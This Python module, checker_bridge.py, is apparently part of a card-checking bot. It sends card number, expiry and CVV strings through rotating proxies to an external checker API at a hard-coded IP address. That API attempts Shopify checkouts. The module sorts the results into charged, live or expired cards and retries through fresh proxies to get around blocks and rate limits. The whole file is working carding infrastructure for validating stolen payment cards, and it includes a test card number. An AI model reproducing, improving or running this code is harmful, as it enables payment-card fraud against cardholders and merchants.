"""
checker_bridge.py — Single-node Shopify checker API with auto-detect retry.
Logic: Only known card gateway responses pass through. Everything else retries.
"""

import asyncio
import aiohttp
import json
import time
import logging
from urllib.parse import unquote as _urlunquote
from yarl import URL

log = logging.getLogger("checker_bridge")
log.setLevel(logging.DEBUG)

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════════════

API_BASE = "http://5.175.222.144:8081"
MAX_RETRIES = 4          # Retry up to 4 proxies before giving up
REQUEST_TIMEOUT = 60     # 120 → 60
_CONNECT_TIMEOUT = 5
RETRY_DELAY = 0.5        # 1.0 → 0.5

# ── WHITELIST: Yehi responses "sahi" hain → NO retry, directly show ─────────
_GOOD_RESPONSES = (
    # Charged / Success
    'order_placed', 'order completed', 'charged', 'approved', 'live',
    # CVV matched / Insufficient funds = LIVE card
    'insufficient_funds', 'insufficient funds',
    'incorrect_cvc', 'invalid_cvc', 'incorrect_cvv', 'invalid_cvv',
    'incorrect_zip',
    # Declined = definitive gateway result (NOT an error)
    'card_declined', 'do_not_honor', 'declined',
    # Other definitive card states
    'expired_card', 'expired',
    'pick_up_card', 'stolen_card',
    'fraudulent', 'fraud_suspected', 'fraud',
    '3ds', 'otp_required', 'authentication_required',
    'risky', 'ccn', 'live_limit',
    'cvv', 'ccv', 'zip',
    # Additional card-level responses from logs
    'base credit card is expired',
    'payments_credit_card_base_expired',
    'generic_error',
    'decision_rule_block',
    'validation_custom',
)

# ── BLACKLIST: Site-level dead errors → NO retry (immediately return) ───────
_NO_RETRY_RESPONSES = (
    'not a shopify site',
    'http 404', '404 not found',
    'cart must include a product',
    'order subtotal is less than',
    'payment flexibility terms id mismatch',
    'merchandise_out_of_stock',
    'amount_too_small', 'amount too small',
    'delivery_address2_required',
    'tax_new_tax_must_be_accepted',
    'no valid payment method found',
    'site error (http 429)',         # Rate limit — same proxy se retry bekaar
    'site error (http 404)',         # Dead site
    # 'unable to get payment token: 403',  # REMOVED → now retries with next proxy
)

# ══════════════════════════════════════════════════════════════════════════════
#  HTTP SESSION
# ══════════════════════════════════════════════════════════════════════════════

_session: aiohttp.ClientSession | None = None

async def _get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        conn = aiohttp.TCPConnector(
            limit=8000,
            limit_per_host=2000,
            ttl_dns_cache=300,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
        )
        _session = aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(
                total=REQUEST_TIMEOUT,
                connect=_CONNECT_TIMEOUT,
            ),
        )
    return _session


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY FORMATTER  →  host:port:user:pass
# ══════════════════════════════════════════════════════════════════════════════

def _proxy_data_to_proxy_str(proxy_data: dict | None) -> str | None:
    """Convert bot.py proxy dict to host:port:user:pass (no protocol)."""
    if not proxy_data:
        return None

    existing = proxy_data.get("proxy_url")
    if existing and isinstance(existing, str) and existing.strip():
        url = existing.strip()
        if "://" in url:
            _, rest = url.split("://", 1)
        else:
            rest = url

        if "@" in rest:
            auth, hostport = rest.split("@", 1)
            if ":" in hostport:
                host, port = hostport.rsplit(":", 1)
                if ":" in auth:
                    user, pw = auth.split(":", 1)
                    user = _urlunquote(user)
                    pw = _urlunquote(pw)
                    return f"{host}:{port}:{user}:{pw}"
                return f"{host}:{port}"
        else:
            if ":" in rest:
                parts = rest.split(":")
                if len(parts) == 4:
                    return rest
                elif len(parts) == 2:
                    return rest
        return rest

    ip   = str(proxy_data.get("ip")   or "").strip()
    port = str(proxy_data.get("port") or "").strip()
    user = proxy_data.get("username")
    pw   = proxy_data.get("password")

    if not ip or not port:
        return None

    if user and pw:
        return f"{ip}:{port}:{user}:{pw}"
    return f"{ip}:{port}"


# ══════════════════════════════════════════════════════════════════════════════
#  RESULT NORMALISATION
# ══════════════════════════════════════════════════════════════════════════════

def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
    response = raw.get("Response", "Unknown")
    price    = raw.get("Price", "-")
    gate     = raw.get("Gate", "Shopify")

    rl = response.lower()
    if "order_placed" in rl or "order completed" in rl or "💎" in response:
        status = "Charged"
    elif any(k in rl for k in [
        "invalid_cvv", "incorrect_cvv", "insufficient_funds",
        "approved", "invalid_cvc", "incorrect_cvc",
        "incorrect_zip", "insufficient funds",
    ]):
        status = "Approved"
    elif "expired" in rl or "base credit card is expired" in rl:
        status = "Expired"
    else:
        status = response

    result = {
        "Response": response,
        "Price":    price,
        "Gate":     gate,
        "Status":   status,
        "CC":       raw.get("CC", cc_str),
        "Site":     raw.get("Site", site_url),
    }
    p = str(result["Price"])
    if p not in ("-", "", "0.00") and not p.startswith("$"):
        # Clean float artifacts: 1.660000000000001 CAD → $1.66 CAD
        import re
        m = re.match(r"^(\d+(?:\.\d+)?)(.*)$", p.strip())
        if m:
            try:
                num = float(m.group(1))
                suffix = m.group(2).strip()
                result["Price"] = f"${num:.2f}" + (f" {suffix}" if suffix else "")
            except ValueError:
                result["Price"] = f"${p}"
        else:
            result["Price"] = f"${p}"
    return result


def _is_good_response(response_text: str) -> bool:
    if not response_text or response_text.strip().lower() == "unknown":
        return False
    rl = response_text.lower()
    return any(good in rl for good in _GOOD_RESPONSES)


def _should_not_retry(response_text: str) -> bool:
    """True = definitive non-retryable error (dead site, blocked proxy, etc.)"""
    if not response_text:
        return False
    rl = response_text.lower()
    return any(bad in rl for bad in _NO_RETRY_RESPONSES)


# ══════════════════════════════════════════════════════════════════════════════
#  SINGLE API CALL
# ══════════════════════════════════════════════════════════════════════════════

async def _call_api(cc_str: str, site_url: str, proxy_str: str) -> dict:
    """Call the checker API. Returns dict or raises on failure."""
    sess = await _get_session()

    site_param = f"&site={site_url}" if site_url else ""
    url_str = f"{API_BASE}/?{cc_str}&proxy={proxy_str}{site_param}"
    url = URL(url_str, encoded=True)

    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
    log.debug(f"[api] → {API_BASE} | cc=...{cc4} | site={site_url} | proxy={proxy_str[:35]}...")

    async with sess.get(
        url,
        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=_CONNECT_TIMEOUT),
    ) as resp:
        if resp.status != 200:
            text = await resp.text()
            raise RuntimeError(f"HTTP {resp.status}: {text[:80]}")

        text = (await resp.text()).strip()
        try:
            data = json.loads(text)
        except Exception:
            data = {"Response": text, "Price": "-", "Gate": "Shopify"}
        return data


# ══════════════════════════════════════════════════════════════════════════════
#  PUBLIC API
# ══════════════════════════════════════════════════════════════════════════════

async def check_card_site(
    cc_str: str,
    site_url: str,
    proxy_data: dict | None,
    proxy_list: list | None = None,
) -> dict:
    """
    Main entry point.
    • Proper card result = return immediately
    • Non-retryable site error = return immediately (no wasted retries)
    • Retryable error = retry up to MAX_RETRIES with proxy rotation
    """
    # Build proxy rotation list
    proxies: list[str] = []
    if proxy_data:
        pstr = _proxy_data_to_proxy_str(proxy_data)
        if pstr:
            proxies.append(pstr)
    if proxy_list:
        for p in proxy_list:
            pstr = _proxy_data_to_proxy_str(p)
            if pstr and pstr not in proxies:
                proxies.append(pstr)

    if not proxies:
        return {
            "Response": "No proxy – add one with /proxy",
            "Price": "-", "Gate": "-", "Status": "No proxy",
            "CC": cc_str, "Site": site_url,
        }

    t_start = time.monotonic()
    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
    log.info(f"[bridge] check_card_site | cc=...{cc4} | site={site_url} | proxies={len(proxies)}")

    last_result = None
    last_err = "Unknown error"
    proxy_idx = 0

    for attempt in range(1, MAX_RETRIES + 1):
        proxy_str = proxies[proxy_idx % len(proxies)]
        try:
            raw = await _call_api(cc_str, site_url, proxy_str)
            result = _map_result(raw, cc_str, site_url)
            response_text = result.get("Response", "")

            log.info(
                f"[bridge] attempt {attempt}/{MAX_RETRIES} | {(time.monotonic()-t_start)*1000:.0f}ms"
                f" | status={result.get('Status')} | resp={response_text[:60]}"
            )

            # ✅ Good card result — return immediately
            if _is_good_response(response_text):
                return result

            # 🚫 Blacklisted site error — return immediately (no wasted retries)
            if _should_not_retry(response_text):
                log.warning(f"[bridge] non-retryable error on attempt {attempt}: {response_text[:60]}")
                return result

            # ⚠️ Retryable — rotate proxy and retry
            last_result = result
            last_err = f"Retryable: {response_text[:80]}"
            log.warning(f"[bridge] retrying attempt {attempt} with next proxy...")

            if attempt < MAX_RETRIES:
                proxy_idx += 1
                await asyncio.sleep(RETRY_DELAY)

        except Exception as e:
            last_err = f"{type(e).__name__}: {str(e)[:80]}"
            log.warning(f"[bridge] attempt {attempt}/{MAX_RETRIES} exception — {last_err}")
            if attempt < MAX_RETRIES:
                proxy_idx += 1
                await asyncio.sleep(RETRY_DELAY)
            else:
                break

    if last_result is not None:
        log.warning(f"[bridge] all {MAX_RETRIES} retries done, returning last response")
        return last_result

    return {
        "Response": f"API Error after {MAX_RETRIES} retries: {last_err}",
        "Price": "-", "Gate": "-", "Status": "Error",
        "CC": cc_str, "Site": site_url,
    }


async def test_site(
    site_url:   str,
    proxy_data: dict | None,
    test_card:  str = "4031630422575208|01|2030|280",
) -> dict:
    raw = await check_card_site(test_card, site_url, proxy_data)
    response_text = raw.get("Response", "")
    price = raw.get("Price", "-")
    status = "working"
    if "proxy dead" in response_text.lower():
        status = "proxy_dead"
    elif not _is_good_response(response_text):
        status = "dead"
    return {"status": status, "response": response_text, "site": site_url, "price": price}


# ══════════════════════════════════════════════════════════════════════════════
#  BACKWARD COMPAT (node management — single API, no-op)
# ══════════════════════════════════════════════════════════════════════════════

def get_all_nodes() -> list[str]:
    return [API_BASE]

async def check_node_health(node: str) -> bool:
    if node == API_BASE:
        try:
            sess = await _get_session()
            async with sess.get(
                f"{API_BASE}/",
                timeout=aiohttp.ClientTimeout(total=6, connect=4),
            ) as r:
                return r.status == 200
        except Exception:
            return False
    return False

def is_node_disabled(node: str) -> bool:
    return False

def disable_node(node: str) -> None:
    log.info(f"[api] disable_node is no-op in single-API mode: {node}")

def enable_node(node: str) -> None:
    log.info(f"[api] enable_node is no-op in single-API mode: {node}")
